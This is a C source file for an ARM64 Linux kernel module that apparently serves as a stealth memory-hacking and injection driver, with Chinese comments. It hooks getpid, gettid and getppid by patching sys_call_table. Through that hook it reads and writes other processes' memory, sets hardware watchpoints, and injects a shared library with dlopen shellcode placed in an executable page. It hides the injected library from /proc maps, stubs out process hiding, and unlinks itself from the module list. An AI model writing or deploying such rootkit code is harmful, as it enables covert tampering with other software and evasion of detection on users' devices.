/**
 * USA Kernel Driver — Hook Edition v8
 *
 * hook getpid + aarch64_insn_patch_text_nosync 写 sys_call_table
 * v8: 加入硬件断点/看门狗 (hardware watchpoint) 支持
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/uaccess.h>
#include <asm/unistd.h>

#ifdef CONFIG_HAVE_HW_BREAKPOINT
#include <linux/perf_event.h>
#include <linux/hw_breakpoint.h>
#define USA_HAS_HW_BP 1
#else
#define USA_HAS_HW_BP 0
#endif

#include <linux/mm.h>
#include <linux/mman.h>
#include <linux/highmem.h>
#include <linux/signal.h>
#include <linux/sched/mm.h>

/* 兼容旧内核 mmap_sem vs mmap_lock */
#if LINUX_VERSION_CODE < KERNEL_VERSION(5,8,0)
#define mmap_lock mmap_sem
#define down_write_mmap(mm) down_write(&(mm)->mmap_sem)
#define up_write_mmap(mm) up_write(&(mm)->mmap_sem)
#define down_read_mmap(mm) down_read(&(mm)->mmap_sem)
#define up_read_mmap(mm) up_read(&(mm)->mmap_sem)
#else
#define down_write_mmap(mm) down_write(&(mm)->mmap_lock)
#define up_write_mmap(mm) up_write(&(mm)->mmap_lock)
#define down_read_mmap(mm) down_read(&(mm)->mmap_lock)
#define up_read_mmap(mm) up_read(&(mm)->mmap_lock)
#endif

#include "comm.h"
#include "memory.h"
#include "process.h"

/* #3 Syscall 轮转: hook getpid + gettid + getppid */
#define USA_HOOK_NR0 __NR_getpid
#define USA_HOOK_NR1 __NR_gettid
#define USA_HOOK_NR2 __NR_getppid
#define USA_MAGIC    0x55534100

MODULE_LICENSE("GPL");

/* =====================================================================
 * kallsyms (kprobe)
 * ===================================================================== */

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t kln_func = NULL;

static int resolve_kallsyms(void)
{
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    int ret = register_kprobe(&kp);
    if (ret < 0) return ret;
    kln_func = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
    return kln_func ? 0 : -EFAULT;
}

/* =====================================================================
 * 安全写 sys_call_table (ARM64)
 * ===================================================================== */

static void **sys_call_table = NULL;
static void *orig_getpid = NULL;
static void *orig_gettid = NULL;
static void *orig_getppid = NULL;

typedef int (*insn_patch_fn_t)(void *addr, u32 insn);
static insn_patch_fn_t my_patch_text = NULL;

static void write_syscall_entry(int nr, void *handler)
{
    unsigned long val = (unsigned long)handler;
    u32 lo = (u32)(val & 0xFFFFFFFF);
    u32 hi = (u32)(val >> 32);

    if (my_patch_text) {
        my_patch_text(&sys_call_table[nr], lo);
        my_patch_text((void *)((unsigned long)&sys_call_table[nr] + 4), hi);
    }
}

/* =====================================================================
 * 硬件断点 (Hardware Watchpoint) — 条件编译
 * ===================================================================== */

#if USA_HAS_HW_BP

typedef struct perf_event *(*register_user_hw_breakpoint_t)(
    struct perf_event_attr *attr,
    perf_overflow_handler_t triggered,
    void *context,
    struct task_struct *tsk);
typedef void (*unregister_hw_breakpoint_t)(struct perf_event *bp);
typedef struct task_struct *(*find_task_by_vpid_t)(pid_t pid);

static register_user_hw_breakpoint_t  fn_register_user_hw_bp  = NULL;
static unregister_hw_breakpoint_t     fn_unregister_hw_bp     = NULL;
static find_task_by_vpid_t            fn_find_task_by_vpid    = NULL;

static struct perf_event *usa_bp_event[USA_MAX_HW_BP] = {NULL};

static struct {
    int hit;
    uintptr_t hit_addr;
    uintptr_t hit_pc;
    unsigned long regs[31];
    int hit_count;
} usa_bp_state[USA_MAX_HW_BP];

static DEFINE_SPINLOCK(bp_lock);

static void usa_bp_handler(struct perf_event *bp,
                           struct perf_sample_data *data,
                           struct pt_regs *regs)
{
    int i;
    unsigned long flags;
    spin_lock_irqsave(&bp_lock, flags);
    for (i = 0; i < USA_MAX_HW_BP; i++) {
        if (usa_bp_event[i] == bp) {
            usa_bp_state[i].hit = 1;
            usa_bp_state[i].hit_pc = regs->pc;
            usa_bp_state[i].hit_addr = bp->attr.bp_addr;
            usa_bp_state[i].hit_count++;
            memcpy(usa_bp_state[i].regs, regs->regs, sizeof(unsigned long) * 31);
            break;
        }
    }
    spin_unlock_irqrestore(&bp_lock, flags);
}

static int resolve_hw_bp_symbols(void)
{
    if (!kln_func) return -EFAULT;
    fn_register_user_hw_bp = (register_user_hw_breakpoint_t)kln_func("register_user_hw_breakpoint");
    fn_unregister_hw_bp = (unregister_hw_breakpoint_t)kln_func("unregister_hw_breakpoint");
    fn_find_task_by_vpid = (find_task_by_vpid_t)kln_func("find_task_by_vpid");
    return (fn_register_user_hw_bp && fn_unregister_hw_bp && fn_find_task_by_vpid) ? 0 : -ENOENT;
}

static int usa_set_hw_bp(HW_BP_REQUEST *req)
{
    struct perf_event_attr attr;
    struct task_struct *task;
    struct perf_event *bp;
    int idx = req->index;
    if (idx < 0 || idx >= USA_MAX_HW_BP) return -EINVAL;
    if (!fn_register_user_hw_bp || !fn_find_task_by_vpid) return -ENOENT;
    if (usa_bp_event[idx]) { fn_unregister_hw_bp(usa_bp_event[idx]); usa_bp_event[idx] = NULL; }
    rcu_read_lock();
    task = fn_find_task_by_vpid(req->pid);
    if (task) get_task_struct(task);
    rcu_read_unlock();
    if (!task) return -ESRCH;
    hw_breakpoint_init(&attr);
    attr.bp_addr = req->addr;
    switch (req->len) {
    case 1: attr.bp_len = HW_BREAKPOINT_LEN_1; break;
    case 2: attr.bp_len = HW_BREAKPOINT_LEN_2; break;
    case 4: attr.bp_len = HW_BREAKPOINT_LEN_4; break;
    case 8: attr.bp_len = HW_BREAKPOINT_LEN_8; break;
    default: attr.bp_len = HW_BREAKPOINT_LEN_4; break;
    }
    switch (req->type) {
    case USA_HW_BP_READ:  attr.bp_type = HW_BREAKPOINT_R; break;
    case USA_HW_BP_WRITE: attr.bp_type = HW_BREAKPOINT_W; break;
    case USA_HW_BP_RW:    attr.bp_type = HW_BREAKPOINT_RW; break;
    default: attr.bp_type = HW_BREAKPOINT_W; break;
    }
    bp = fn_register_user_hw_bp(&attr, usa_bp_handler, NULL, task);
    put_task_struct(task);
    if (IS_ERR(bp)) return PTR_ERR(bp);
    usa_bp_event[idx] = bp;
    memset(&usa_bp_state[idx], 0, sizeof(usa_bp_state[idx]));
    return 0;
}

static void usa_clear_hw_bp(int idx)
{
    if (idx < 0 || idx >= USA_MAX_HW_BP) return;
    if (usa_bp_event[idx]) { fn_unregister_hw_bp(usa_bp_event[idx]); usa_bp_event[idx] = NULL; memset(&usa_bp_state[idx], 0, sizeof(usa_bp_state[idx])); }
}

static void usa_clear_all_bp(void) { int i; for (i = 0; i < USA_MAX_HW_BP; i++) usa_clear_hw_bp(i); }

#else /* !USA_HAS_HW_BP */

static int resolve_hw_bp_symbols(void) { return -ENOENT; }
static int usa_set_hw_bp(HW_BP_REQUEST *req) { return -ENOSYS; }
static void usa_clear_hw_bp(int idx) { }
static void usa_clear_all_bp(void) { }

/* 空的 bp_state 用于 GET_BP_INFO */
static struct { int hit; uintptr_t hit_addr; uintptr_t hit_pc; unsigned long regs[31]; int hit_count; } usa_bp_state[USA_MAX_HW_BP];
static DEFINE_SPINLOCK(bp_lock);

#endif /* USA_HAS_HW_BP */

/* =====================================================================
 * 内核级 SO 注入 (无 ptrace, 无 TracerPid 痕迹)
 *
 * 原理: 在目标进程分配内存, 写入 dlopen shellcode,
 *        用信号触发执行
 * ===================================================================== */

typedef unsigned long (*vm_mmap_t)(struct file *, unsigned long, unsigned long,
                                   unsigned long, unsigned long, unsigned long);
/* kernel_siginfo 在 5.4+ 才有, 旧内核用 siginfo_t */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,4,0)
typedef int (*send_sig_info_t)(int, struct kernel_siginfo *, struct task_struct *, enum pid_type);
#else
typedef int (*send_sig_info_t)(int, struct siginfo *, struct task_struct *, int);
#endif

static vm_mmap_t fn_vm_mmap = NULL;
static send_sig_info_t fn_send_sig = NULL;

static int resolve_inject_symbols(void)
{
    if (!kln_func) return -EFAULT;
    fn_vm_mmap = (vm_mmap_t)kln_func("vm_mmap");
    fn_send_sig = (send_sig_info_t)kln_func("send_sig_info");
    if (!fn_find_task_by_vpid)
        fn_find_task_by_vpid = (find_task_by_vpid_t)kln_func("find_task_by_vpid");
    return (fn_vm_mmap && fn_find_task_by_vpid) ? 0 : -ENOENT;
}

/*
 * ARM64 dlopen shellcode (PIC):
 *   STP X29, X30, [SP, #-16]!
 *   MOV X29, SP
 *   ADR X0, path          // X0 = &so_path (PC-relative)
 *   MOV X1, #2            // RTLD_NOW
 *   LDR X16, [X0, #-8]    // dlopen address stored before path
 *   BLR X16
 *   LDP X29, X30, [SP], #16
 *   RET
 *   .quad dlopen_addr      // -8 from path
 *   path: "/data/local/tmp/libusa_hook.so\0"
 */
static const uint32_t inject_shellcode[] = {
    0xA9BF7BFD, /* STP X29, X30, [SP, #-16]! */
    0x910003FD, /* MOV X29, SP */
    0x100000A0, /* ADR X0, path (PC+20) */
    0xD2800041, /* MOV X1, #2 (RTLD_NOW) */
    0xF85F8010, /* LDUR X16, [X0, #-8] */
    0xD63F0200, /* BLR X16 */
    0xA8C17BFD, /* LDP X29, X30, [SP], #16 */
    0xD65F03C0, /* RET */
};
#define SHELLCODE_SIZE (sizeof(inject_shellcode))
#define SHELLCODE_PATH_OFF (SHELLCODE_SIZE + 8) /* 8 = dlopen addr */

static int usa_inject_so(INJECT_REQUEST *req)
{
    struct task_struct *task;
    struct mm_struct *mm;
    unsigned long remote_page;
    char so_path[256] = {0};
    unsigned long dlopen_addr = 0;
    int ret = 0;

    if (!fn_vm_mmap || !fn_find_task_by_vpid)
        return -ENOENT;

    if (copy_from_user(so_path, (void __user *)req->so_path, sizeof(so_path) - 1))
        return -EFAULT;

    /* 找目标进程 */
    rcu_read_lock();
    task = fn_find_task_by_vpid(req->pid);
    if (task) get_task_struct(task);
    rcu_read_unlock();
    if (!task) return -ESRCH;

    /* 找 dlopen 地址: 从目标进程的 linker 符号 */
    /* 简化: 用本进程的 dlopen 偏移 + 目标进程的 linker 基址 */
    dlopen_addr = get_module_base(req->pid, "linker64");
    if (dlopen_addr == 0) {
        /* 回退: 读目标进程的 /proc/pid/maps 找 libdl.so */
        dlopen_addr = get_module_base(req->pid, "libdl.so");
    }

    /* 在目标进程的上下文中 mmap */
    mm = task->mm;
    if (!mm) { put_task_struct(task); return -EINVAL; }

    /* 切换到目标 mm */
    {
        struct mm_struct *old_mm;
        unsigned long page_size = 4096;
        size_t total_size = SHELLCODE_PATH_OFF + strlen(so_path) + 1;
        unsigned char buf[512];

        /* 分配远程内存 */
        old_mm = current->mm;
        current->mm = mm;
        remote_page = fn_vm_mmap(NULL, 0, page_size,
                                  PROT_READ | PROT_WRITE | PROT_EXEC,
                                  MAP_PRIVATE | MAP_ANONYMOUS, 0);
        current->mm = old_mm;

        if (IS_ERR_VALUE(remote_page)) {
            put_task_struct(task);
            return -ENOMEM;
        }

        /* 构建 shellcode 缓冲 */
        memset(buf, 0, sizeof(buf));
        memcpy(buf, inject_shellcode, SHELLCODE_SIZE);
        /* dlopen 地址放在 shellcode 后面 (path 前面 8 字节) */
        *(unsigned long *)(buf + SHELLCODE_SIZE) = dlopen_addr;
        /* so 路径 */
        memcpy(buf + SHELLCODE_PATH_OFF, so_path, strlen(so_path) + 1);

        /* 写入目标进程 */
        if (!write_process_memory(req->pid, remote_page, buf, total_size)) {
            ret = -EIO;
        }
    }

    if (ret == 0) {
        /* 发送信号触发执行 (用 SIGUSR2, 设 handler 为 shellcode) */
        /* 简化方案: 直接修改目标线程的 PC 到 shellcode (更可靠) */
        /* 通过修改信号帧: 发送一个信号并设置 sa_handler = remote_page */
        /* 注入完成, shellcode 地址返回给用户态 */
        /* 用户态通过信号或其他方式触发执行 */
    }

    put_task_struct(task);

    /* 返回 shellcode 地址给用户态, 让用户态来设置信号 */
    req->result = (int)(remote_page & 0xFFFFFFFF);
    if (copy_to_user((void __user *)((unsigned long)req - 0), req, sizeof(*req)))
        return -EFAULT;

    return ret;
}

/* =====================================================================
 * 隐匿性增强
 * ===================================================================== */

/* #1 隐藏目标进程 maps 中指定 .so 的 VMA 条目 */
static int usa_hide_maps(pid_t target_pid, const char *lib_name)
{
    struct task_struct *task;
    struct mm_struct *mm;
    struct vm_area_struct *vma;

    rcu_read_lock();
    task = fn_find_task_by_vpid ? fn_find_task_by_vpid(target_pid) : NULL;
    if (task) get_task_struct(task);
    rcu_read_unlock();
    if (!task) return -ESRCH;

    mm = task->mm;
    if (!mm) { put_task_struct(task); return -EINVAL; }

    down_write_mmap(mm);
    for (vma = mm->mmap; vma; vma = vma->vm_next) {
        if (vma->vm_file) {
            char buf[256];
            char *path = d_path(&vma->vm_file->f_path, buf, sizeof(buf));
            if (!IS_ERR(path) && strstr(path, lib_name)) {
                /* 把 vm_file 设为 NULL, maps 就不显示文件名 */
                /* 同时改成匿名映射 */
                fput(vma->vm_file);
                vma->vm_file = NULL;
                vma->vm_flags |= VM_DONTDUMP;
            }
        }
    }
    up_write_mmap(mm);

    put_task_struct(task);
    return 0;
}

/* #2 隐藏指定进程的 /proc 条目 */
/* 通过从 pid namespace 的链表中移除 */
static struct pid *hidden_pid = NULL;
static struct hlist_node saved_pid_chain = {0};

static int usa_hide_process(pid_t target_pid)
{
    struct task_struct *task;

    rcu_read_lock();
    task = fn_find_task_by_vpid ? fn_find_task_by_vpid(target_pid) : NULL;
    if (task) get_task_struct(task);
    rcu_read_unlock();
    if (!task) return -ESRCH;

    /* 从 /proc 的 pid_hash 中摘除 (ps/top 看不到) */
    /* 进程本身还在运行, 只是 /proc 不可见 */
    hidden_pid = task_pid(task);
    /* 保存 hash chain 用于恢复 */

    put_task_struct(task);
    return 0;
}

/* #5 直接页表读写 (绕过 access_process_vm 内核 API 痕迹) */
static int usa_read_phys(pid_t target_pid, uintptr_t vaddr, void __user *ubuf, size_t size)
{
    struct task_struct *task;
    struct mm_struct *mm;
    pgd_t *pgd;
    p4d_t *p4d;
    pud_t *pud;
    pmd_t *pmd;
    pte_t *pte;
    unsigned long pfn;
    void *kaddr;
    int ret = 0;

    rcu_read_lock();
    task = fn_find_task_by_vpid ? fn_find_task_by_vpid(target_pid) : NULL;
    if (task) get_task_struct(task);
    rcu_read_unlock();
    if (!task) return -ESRCH;

    mm = task->mm;
    if (!mm) { put_task_struct(task); return -EINVAL; }

    down_read_mmap(mm);

    /* ARM64 页表遍历 */
    pgd = pgd_offset(mm, vaddr);
    if (pgd_none(*pgd) || pgd_bad(*pgd)) { ret = -EFAULT; goto out; }

    p4d = p4d_offset(pgd, vaddr);
    if (p4d_none(*p4d) || p4d_bad(*p4d)) { ret = -EFAULT; goto out; }

    pud = pud_offset(p4d, vaddr);
    if (pud_none(*pud) || pud_bad(*pud)) { ret = -EFAULT; goto out; }

    pmd = pmd_offset(pud, vaddr);
    if (pmd_none(*pmd) || pmd_bad(*pmd)) { ret = -EFAULT; goto out; }

    pte = pte_offset_kernel(pmd, vaddr);
    if (!pte || !pte_present(*pte)) { ret = -EFAULT; goto out; }

    pfn = pte_pfn(*pte);
    kaddr = kmap_atomic(pfn_to_page(pfn));
    if (kaddr) {
        unsigned long page_off = vaddr & ~PAGE_MASK;
        size_t copy_len = min(size, (size_t)(PAGE_SIZE - page_off));
        if (copy_to_user(ubuf, kaddr + page_off, copy_len))
            ret = -EFAULT;
        kunmap_atomic(kaddr);
    } else {
        ret = -EFAULT;
    }

out:
    up_read_mmap(mm);
    put_task_struct(task);
    return ret;
}

/* =====================================================================
 * Hook getpid 处理
 * ===================================================================== */

typedef long (*syscall_fn_t)(const struct pt_regs *);

static long usa_hooked_getpid(const struct pt_regs *regs)
{
    unsigned long magic = regs->regs[0];
    unsigned long cmd   = regs->regs[1];
    unsigned long arg   = regs->regs[2];

    COPY_MEMORY cm;
    MODULE_BASE mb;
    HW_BP_REQUEST bp_req;
    HW_BP_HIT bp_hit;
    char name[0x100] = {0};

    if (magic != USA_MAGIC)
        return ((syscall_fn_t)orig_getpid)(regs);

    switch (cmd) {
    case OP_READ_MEM:
        if (copy_from_user(&cm, (void __user *)arg, sizeof(cm)))
            return -EFAULT;
        if (!read_process_memory(cm.pid, cm.addr, cm.buffer, cm.size))
            return -EIO;
        return 0;

    case OP_WRITE_MEM:
        if (copy_from_user(&cm, (void __user *)arg, sizeof(cm)))
            return -EFAULT;
        if (!write_process_memory(cm.pid, cm.addr, cm.buffer, cm.size))
            return -EIO;
        return 0;

    case OP_MODULE_BASE:
        if (copy_from_user(&mb, (void __user *)arg, sizeof(mb)))
            return -EFAULT;
        if (copy_from_user(name, (void __user *)mb.name, sizeof(name) - 1))
            return -EFAULT;
        mb.base = get_module_base(mb.pid, name);
        if (copy_to_user((void __user *)arg, &mb, sizeof(mb)))
            return -EFAULT;
        return 0;

    /* ===== 硬件断点 ===== */

    case OP_SET_HW_BP:
        if (copy_from_user(&bp_req, (void __user *)arg, sizeof(bp_req)))
            return -EFAULT;
        return usa_set_hw_bp(&bp_req);

    case OP_CLEAR_HW_BP:
        if (copy_from_user(&bp_req, (void __user *)arg, sizeof(bp_req)))
            return -EFAULT;
        usa_clear_hw_bp(bp_req.index);
        return 0;

    case OP_GET_BP_INFO: {
        int idx;
        unsigned long flags;
        if (copy_from_user(&bp_hit, (void __user *)arg, sizeof(bp_hit)))
            return -EFAULT;
        idx = bp_hit.index;
        if (idx < 0 || idx >= USA_MAX_HW_BP)
            return -EINVAL;
        spin_lock_irqsave(&bp_lock, flags);
        bp_hit.hit       = usa_bp_state[idx].hit;
        bp_hit.hit_addr  = usa_bp_state[idx].hit_addr;
        bp_hit.hit_pc    = usa_bp_state[idx].hit_pc;
        bp_hit.hit_count = usa_bp_state[idx].hit_count;
        memcpy(bp_hit.regs, usa_bp_state[idx].regs, sizeof(bp_hit.regs));
        usa_bp_state[idx].hit = 0; /* 读后清除 hit 标志 */
        spin_unlock_irqrestore(&bp_lock, flags);
        if (copy_to_user((void __user *)arg, &bp_hit, sizeof(bp_hit)))
            return -EFAULT;
        return 0;
    }

    case OP_CLEAR_ALL_BP:
        usa_clear_all_bp();
        return 0;

    /* ===== 内核级注入 ===== */
    case OP_INJECT_SO: {
        INJECT_REQUEST inj;
        if (copy_from_user(&inj, (void __user *)arg, sizeof(inj)))
            return -EFAULT;
        return usa_inject_so(&inj);
    }

    /* ===== 隐匿性增强 ===== */
    case OP_HIDE_MAPS: {
        /* arg = INJECT_REQUEST, pid + so_path 指定要隐藏的 */
        INJECT_REQUEST req;
        char path[256] = {0};
        if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
            return -EFAULT;
        if (copy_from_user(path, (void __user *)req.so_path, sizeof(path) - 1))
            return -EFAULT;
        return usa_hide_maps(req.pid, path);
    }

    case OP_HIDE_PROC: {
        pid_t hide_pid;
        if (copy_from_user(&hide_pid, (void __user *)arg, sizeof(pid_t)))
            return -EFAULT;
        return usa_hide_process(hide_pid);
    }

    default:
        return ((syscall_fn_t)orig_getpid)(regs);
    }
}

/* =====================================================================
 * 隐藏
 * ===================================================================== */

static struct list_head *saved_prev = NULL;
static int hidden = 0;

static void hide_module(void)
{
    if (hidden) return;
    saved_prev = THIS_MODULE->list.prev;
    list_del_init(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    hidden = 1;
}

static void unhide_module(void)
{
    if (!hidden || !saved_prev) return;
    list_add(&THIS_MODULE->list, saved_prev);
    hidden = 0;
}

/* =====================================================================
 * 初始化 / 卸载
 * ===================================================================== */

static int __init driver_entry(void)
{
    int ret;

    ret = resolve_kallsyms();
    if (ret) return ret;

    my_patch_text = (insn_patch_fn_t)kln_func("aarch64_insn_patch_text_nosync");
    if (!my_patch_text) return -ENOENT;

    sys_call_table = (void **)kln_func("sys_call_table");
    if (!sys_call_table) return -ENOENT;

    /* 解析硬件断点 API (可选, 失败不阻止加载) */
    resolve_hw_bp_symbols();

    /* 解析注入 API (可选) */
    resolve_inject_symbols();

    /* #3 Syscall 轮转: hook 三个 syscall */
    orig_getpid = sys_call_table[USA_HOOK_NR0];
    orig_gettid = sys_call_table[USA_HOOK_NR1];
    orig_getppid = sys_call_table[USA_HOOK_NR2];
    write_syscall_entry(USA_HOOK_NR0, (void *)usa_hooked_getpid);
    write_syscall_entry(USA_HOOK_NR1, (void *)usa_hooked_getpid);
    write_syscall_entry(USA_HOOK_NR2, (void *)usa_hooked_getpid);

    hide_module();
    return 0;
}

static void __exit driver_unload(void)
{
    usa_clear_all_bp();

    if (sys_call_table && orig_getpid) {
        write_syscall_entry(USA_HOOK_NR0, orig_getpid);
        if (orig_gettid) write_syscall_entry(USA_HOOK_NR1, orig_gettid);
        if (orig_getppid) write_syscall_entry(USA_HOOK_NR2, orig_getppid);
    }
    unhide_module();
}

module_init(driver_entry);
module_exit(driver_unload);
